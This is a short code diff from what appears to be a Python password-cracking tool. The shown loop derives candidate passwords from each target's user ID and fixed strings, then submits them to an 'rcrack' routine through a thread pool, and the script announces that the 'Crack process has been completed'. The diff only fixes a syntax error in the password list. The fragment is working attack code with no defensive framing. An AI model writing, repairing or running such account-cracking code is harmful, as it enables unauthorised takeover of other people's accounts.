@@ -279,7 +279,7 @@ def random_number():
 			mk = uid[:6]
 			pwx = ['57273200','59039200','57575751']
 			pwx = [guru]
-			pwx = [kode+guru,mk,']
+			pwx = [kode+guru,mk,]
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
